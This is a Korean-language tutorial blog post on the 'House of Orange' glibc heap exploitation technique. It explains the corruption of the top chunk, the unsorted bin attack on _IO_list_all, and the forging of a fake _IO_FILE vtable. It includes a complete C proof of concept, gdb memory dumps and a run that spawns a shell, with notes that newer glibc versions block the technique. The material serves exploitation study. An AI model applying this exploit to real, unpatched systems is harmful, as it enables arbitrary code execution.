---
title: House of Orange
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, house of series]
math: true
mermaid: true
---

## Conditions

- 공격자에 의해 top chunk 영역에 값을 저장할 수 있어야 함
- 공격자에 의해 top chunk의 값보다 큰 값을 생성할 수 있어야 함
- 공격자에 의해 free chunk 영역에 값을 저장할 수 있어야 함

## Exploit plan

1. add free chunk to unsorted bin
    - 1개의 heap 영역 생성
    - top chunk 영역에 값을 덮어씀
        - top chunk + size는 페이지 정렬
        - top chunk 값에 prev_inuse 비트 설정
        - Ex) top chunk : 0x20c01 -> 0xc01
    - top chunk 영역의 값보다 큰 크기의 heap 영역 생성
        - malloc은 요청을 처리하기 위해 sysmalloc 호출
        - `sysmalloc()`의 `_int_free()` 함수에 의해 "top chunk - 0x8" 영역이 unsorted bin에 등록
2. write to fake "struct _IO_FILE_plus", Fake"struct _IO_wide_data"
    - free chunk 영역에 fake "struct _IO_FILE_plus", Fake"struct _IO_wide_data" 구조 작성
        - fake "struct _IO_FILE_plus"
            - _mode = ‘0’ 보다 큰 값
            - vtable = "Fake vtable address"
            - _wide_data = Fake "struct _IO_wide_data" 저장된 주소
        - fake "struct _IO_wide_data"
            - fake "struct _IO_FILE_plus"가 작성된 공간을 활용
            - _IO_flush_all_lockp() 함수에서 사용하지 않는 "fp" 변수의 _freeres_list, "_freeres_buf" 영역 활용
                - fp->_freeres_list = _wide_data->_IO_write_ptr
                - fp->_freeres_buf = _wide_data->_IO_write_base
3. unsorted bin attack
    - free chunk의 bk 영역에 "&_IO_list_all - 0x10" 값을 덮어씀
    - free chunk를 smallbin\[4\]에 등록하기 위해 free chunk size 변경
    - 새로운 heap 영역 생성

## Vunlerability

`sysmalloc()`에서 `_int_free()` 호출하기 위해 다음 조건을 만족해야 한다.

- Top chunk + size는 페이지 정렬되어 있어야 함
- Top chunk 값에 prev_inuse 비트 설정되어 있어야 함

```c
// malloc.c
/*
  If not the first time through, we require old_size to be
  at least MINSIZE and to have prev_inuse set.
*/

assert ((old_top == initial_top (av) && old_size == 0) ||
        ((unsigned long) (old_size) >= MINSIZE &&
        prev_inuse (old_top) &&
        ((unsigned long) old_end & (pagesize - 1)) == 0));

/* Precondition: not enough current space to satisfy nb request */
assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```

glibc의 _int_malloc()에서 메모리 손상을 탐지하고 다음과 같은 순서로 함수 호출한다.

`_int_malloc()` -\> `malloc_printerr()` -\> `__libc_message` -\> `__FI_abort()` -\> `_IO_flush_all_lockp()`

```c
// malloc.c
for (;; )
  {
    int iters = 0;
    while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
      {
        bck = victim->bk;
        if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
            || __builtin_expect (victim->size > av->system_mem, 0))
          malloc_printerr (check_action, "malloc(): memory corruption",
                          chunk2mem (victim), av);
        size = chunksize (victim);
```

### _IO_flush_all_lockp()

top chunk와 unsorted bin attack을 이용해 "_IO_list_all" 값을 변경하였으나, 변경된 값은 main_arena의 주소이다. 즉, "fp" 변수에 저장된 값은 main_arena의 주소이며, 해당 값을 "fp = fp-\>_chain" 코드에 의해 Fake "_IO_FILE_plus" 주소로 변경할 수 있다. `_IO_flush_all_lockp()` 함수는 "fp" 변수에 저장된 주소 값을 기준으로 호출할 `_IO_OVERFLOW()` 함수의 주소를 찾는다.

```c
// genops.c
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
    _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)  // 해당 조건을 만족해야 "_IO_OVERFLOW()" 함수 호출 가능
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
      || (_IO_vtable_offset (fp) == 0
          && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
#endif
      )
      && _IO_OVERFLOW (fp, EOF) == EOF) // 호출되는 "_IO_OVERFLOW()" 함수의 주소 값을 변경하여 system() 호출 가능
    result = EOF;

      if (do_lock)
    _IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
    {
      /* Something was added to the list.  Start all over again.  */
      fp = (_IO_FILE *) _IO_list_all;
      last_stamp = _IO_list_all_stamp;
    }
      else
    fp = fp->_chain; // 해당 코드를 이용해 "fp" 변수에 Fake "_IO_FILE_plus"의 주소를 저장할 수 있다.
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
```

`_IO_list_all` 변수는 `_IO_FILE_plus` 구조체를 사용한다.

```c
// libioP.h
extern struct _IO_FILE_plus *_IO_list_all;
```

_IO_FILE_plus 구조체

```c
// libioP.h
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

**`_IO_FILE` 구조체**

```c
// libio.h - struct _IO_FILE
struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

**`_IO_jump_t` 구조체**

```c
// libioP.h - struct _IO_jump_t
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

### struct _IO_wide_data *_wide_data

```c
// genops.c
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
#endif
```

```c
// libio.h
struct _IO_wide_data *_wide_data

/* Extra data for wide character streams.  */
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;   /* Start of putback+get area. */
  wchar_t *_IO_write_base;  /* Start of put area. */
  wchar_t *_IO_write_ptr;   /* Current put pointer. */
  wchar_t *_IO_write_end;   /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;     /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;   /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base; /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
 
  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
 
  wchar_t _shortbuf[1];
 
  const struct _IO_jump_t *_wide_vtable;
};
```

## Proof of concept

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc
  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/

/*
   This function is just present to emulate the scenario where
   the address of the function system is known.
*/
int winner ( char *ptr);

int main()
{
    /*
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.
      
      At the beginning of execution, the entire heap is part of the Top chunk.
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      Thus, with every allocation, the Top chunks keeps getting smaller.
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
       1) Extend the Top chunk
       2) Mmap a new page
      If the size requested is smaller than 0x21000, then the former is followed.
    */

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");
  
    fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");

    /*
      Firstly, lets allocate a chunk on the heap.
    */

    p1 = malloc(0x400-16);

    /*
       The heap is usually allocated with a top chunk of size 0x21000
       Since we've allocate a chunk of size 0x400 already,
       what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.
       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       it must also be page aligned at the end.
       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.
       So that means that there are two conditions that must always be true.
        1) Top chunk + size has to be page aligned
        2) Top chunk's prev_inuse bit has to be set.
       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       What's left is 0x20c01
       Now, let's satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk's prev_inuse bit has to be set.
    */

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    /* 
       Now we request a chunk of size larger than the size of the Top chunk.
       Malloc tries to service this request by extending the Top chunk
       This forces sysmalloc to be invoked.
       In the usual scenario, the heap looks like the following
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end
       And the new area that gets allocated is contiguous to the old heap end.
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.
       In order to keep track of this change in size, malloc uses a fencepost chunk,
       which is basically a temporary chunk.
       After the size of the Top chunk has been updated, this chunk gets freed.
       In our scenario however, the heap looks like
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end
       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       So the area between the second chunk and the heap end is unused.
       And the old Top chunk gets freed.
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free
       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end
    */

    p2 = malloc(0x1000);
    /*
      Note that the above chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap's end
      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins
      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk's size.
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      There are two common ways to exploit the current state:
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc's main_arena unsorted-bin-list. (requires at least one allocation)
      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.
      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
      _IO_list_all and calling _IO_OVERFLOW on them.
      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
      More about file-pointer exploitation can be found here:
      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/
      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc's main_arena.
    */

    io_list_all = top[2] + 0x9a8;

    /*
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.
      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
      in libc's main_arena.
      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.
      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
      So, we should set chunk->bk to be _IO_list_all - 16
    */
 
    top[3] = io_list_all - 0x10;

    /*
      At the end, the system function will be invoked with the pointer to this file pointer.
      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
    */

    memcpy( ( char *) top, "/bin/sh\x00", 8);

    /*
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      Since we can only overwrite this address with main_arena's unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      The address of the next file pointer is located at base_address+0x68.
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc's bin organisation
      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
      Since we overflow the old top chunk, we also control it's size field.
      Here it gets a little bit tricky, currently the old top chunk is in the
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer's fd-ptr.
      In addition to sorting, malloc will also perform certain size checks on them,
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE "size <= 2 * SIZE_SZ"
      and finally triggering the abort call that gets our chain rolling.
      Here is the corresponding code in the libc:
      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
    */

    top[1] = 0x61;

    /*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813
      We want to satisfy the first condition:
      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    */

    _IO_FILE *fp = (_IO_FILE *) top;

    /*
      1. Set mode to 0: fp->_mode <= 0
    */

    fp->_mode = 0; // top+0xc0

    /*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
    */

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28

    /*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the _IO_FILE struct:
      base_address+sizeof(_IO_FILE) = jump_table
         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
    */

    size_t *jump_table = &top[12]; // controlled memory
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8

    /* Finally, trigger the whole chain by calling malloc */
    malloc(10);

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);
    return 0;
}
```

malloc(0x400 - 0x10) 할당한다.

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x602000            0x0                 0x400                Used                None              None
```

top chunk + size는 page 정렬이 되어있어야 한다. top chunk 값에 prev_inuse bit 설정한다.

```
gdb-peda$ x/24gx 0x602400
0x602400:   0x0000000000000000  0x0000000000000c01
```

0x1000 할당하여 old Top chunk가 unsortedbin에 등록, free chunk가 된다. 새로운 Top chunk가 생성된다.

```
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x624010 (size : 0x20ff0) 
      last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x602400 (size : 0xbe0)
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x602000            0x0                 0x400                Used                None              None
0x602400            0x0                 0xbe0                Freed     0x7ffff7dd1b78    0x7ffff7dd1b78
```

top\[2\] + 0x9a8 = 0x00007ffff7dd2520 \<- `_IO_list_all`

old Top chunk의 bk 영역에 "_IO_list_all - 0x10" 삽입하여 _IO_list_all에 main_arena+88 영역이 등록되도록 한다.

```
gdb-peda$ x/24gx 0x602400
0x602400:   0x0000000000000000  0x0000000000000be1
0x602410:   0x00007ffff7dd1b78  0x00007ffff7dd2510 <- _IO_list_all - 0x10
```

`_IO_OVERFLOW(fp, EOF)` \<- fp를 인자로 입력받아서 _IO_OVERFLOW(system)을 실행시킬 것이다. fp-\>chain을 통해 fp를 변조하기 위해 size를 smallbin\[4\]의 크기로 변조한다.

```
gdb-peda$ x/24gx 0x602400
0x602400:   0x0068732f6e69622f <- arg  0x0000000000000061 <- size
0x602410:   0x00007ffff7dd1b78         0x00007ffff7dd2510
```

_IO_OVERFLOW를 실행시키기 위해 다음과 같이 Fake _IO_FILE 영역을 변조한다.

- fp->_mode = 0;
- fp->_IO_write_base = (char *) 2;
- fp->_IO_write_ptr = (char *) 3;

jump_table\[3\](_IO_OVERFLOW) 위치를 winner()의 주소로 변조한다.

```
gdb-peda$ x/24gx 0x602400
0x602400:   0x0068732f6e69622f  0x0000000000000061
0x602410:   0x00007ffff7dd1b78  0x00007ffff7dd2510
0x602420:   0x0000000000000002  0x0000000000000003
0x602430:   0x0000000000000000  0x0000000000000000
0x602440:   0x0000000000000000  0x0000000000000000
0x602450:   0x0000000000000000  0x0000000000000000
0x602460:   0x0000000000000000  0x0000000000000000
0x602470:   0x0000000000000000  0x000000000040078f <- _IO_OVERFLOW()
```

fp = fp->_chain 코드에 의해 smallbin\[4\](0x602400)에 저장된 값이 fp에 저장된다.

```
gdb-peda$ p fp
$1 = (struct _IO_FILE *) 0x7ffff7dd1b78 <main_arena+88>
gdb-peda$ x/24gx 0x7ffff7dd1b78
0x7ffff7dd1b78 <main_arena+88>: 0x0000000000624010  0x0000000000000000
0x7ffff7dd1b88 <main_arena+104>:    0x0000000000602400  0x00007ffff7dd2510
0x7ffff7dd1b98 <main_arena+120>:    0x00007ffff7dd1b88  0x00007ffff7dd1b88
0x7ffff7dd1ba8 <main_arena+136>:    0x00007ffff7dd1b98  0x00007ffff7dd1b98
0x7ffff7dd1bb8 <main_arena+152>:    0x00007ffff7dd1ba8  0x00007ffff7dd1ba8
0x7ffff7dd1bc8 <main_arena+168>:    0x00007ffff7dd1bb8  0x00007ffff7dd1bb8
0x7ffff7dd1bd8 <main_arena+184>:    0x0000000000602400  0x0000000000602400 <- smallbin[4]
0x7ffff7dd1be8 <main_arena+200>:    0x00007ffff7dd1bd8  0x00007ffff7dd1bd8
0x7ffff7dd1bf8 <main_arena+216>:    0x00007ffff7dd1be8  0x00007ffff7dd1be8
0x7ffff7dd1c08 <main_arena+232>:    0x00007ffff7dd1bf8  0x00007ffff7dd1bf8
0x7ffff7dd1c18 <main_arena+248>:    0x00007ffff7dd1c08  0x00007ffff7dd1c08
0x7ffff7dd1c28 <main_arena+264>:    0x00007ffff7dd1c18  0x00007ffff7dd1c18
gdb-peda$ p fp
$3 = (struct _IO_FILE *) 0x602400
```

변경된 fp 값에 의해 vtable 주소가 변경되었다. * 0x602400 + 0xd8 = 0x602460(vtable) * 0x602460 + 0x18 = 0x40078f(_IO_overflow_t)

```
beomsu317@ubuntu-16:~/pwnable/house_of_orange$ ./hoo 
The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).
Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commith=db3476aff19b75c4fdefbe65fcd5f0a90588ba51
* Error in `./hoo': malloc(): memory corruption: 0x00007f1ecdea8520 *
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f1ecdb5a7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f1ecdb6513e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f1ecdb67184]
./hoo[0x400788]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f1ecdb03830]
./hoo[0x400589]
======= Memory map: ========
00400000-00401000 r-xp 00000000 00:1e 152321                             /home/beomsu317/pwnable/house_of_orange/hoo
00600000-00601000 r--p 00000000 00:1e 152321                             /home/beomsu317/pwnable/house_of_orange/hoo
00601000-00602000 rw-p 00001000 00:1e 152321                             /home/beomsu317/pwnable/house_of_orange/hoo
01a7d000-01ac0000 rw-p 00000000 00:00 0                                  [heap]
7f1ec8000000-7f1ec8021000 rw-p 00000000 00:00 0 
7f1ec8021000-7f1ecc000000 ---p 00000000 00:00 0 
7f1ecd8cd000-7f1ecd8e3000 r-xp 00000000 00:1e 1160                       /lib/x86_64-linux-gnu/libgcc_s.so.1
7f1ecd8e3000-7f1ecdae2000 ---p 00016000 00:1e 1160                       /lib/x86_64-linux-gnu/libgcc_s.so.1
7f1ecdae2000-7f1ecdae3000 rw-p 00015000 00:1e 1160                       /lib/x86_64-linux-gnu/libgcc_s.so.1
7f1ecdae3000-7f1ecdca3000 r-xp 00000000 00:1e 1139                       /lib/x86_64-linux-gnu/libc-2.23.so
7f1ecdca3000-7f1ecdea3000 ---p 001c0000 00:1e 1139                       /lib/x86_64-linux-gnu/libc-2.23.so
7f1ecdea3000-7f1ecdea7000 r--p 001c0000 00:1e 1139                       /lib/x86_64-linux-gnu/libc-2.23.so
7f1ecdea7000-7f1ecdea9000 rw-p 001c4000 00:1e 1139                       /lib/x86_64-linux-gnu/libc-2.23.so
7f1ecdea9000-7f1ecdead000 rw-p 00000000 00:00 0 
7f1ecdead000-7f1ecded3000 r-xp 00000000 00:1e 1119                       /lib/x86_64-linux-gnu/ld-2.23.so
7f1ece0c8000-7f1ece0cb000 rw-p 00000000 00:00 0 
7f1ece0d1000-7f1ece0d2000 rw-p 00000000 00:00 0 
7f1ece0d2000-7f1ece0d3000 r--p 00025000 00:1e 1119                       /lib/x86_64-linux-gnu/ld-2.23.so
7f1ece0d3000-7f1ece0d4000 rw-p 00026000 00:1e 1119                       /lib/x86_64-linux-gnu/ld-2.23.so
7f1ece0d4000-7f1ece0d5000 rw-p 00000000 00:00 0 
7fffd4ebf000-7fffd4ee0000 rw-p 00000000 00:00 0                          [stack]
7fffd4eff000-7fffd4f02000 r--p 00000000 00:00 0                          [vvar]
7fffd4f02000-7fffd4f04000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
$ id
uid=1000(beomsu317) gid=1000(beomsu317) groups=1000(beomsu317)
```

## References

- [House of Orange](https://www.lazenca.net/display/TEC/House+of+Orange)
- [house_of_orange (2)](https://youngsouk-hack.tistory.com/58?category=846136)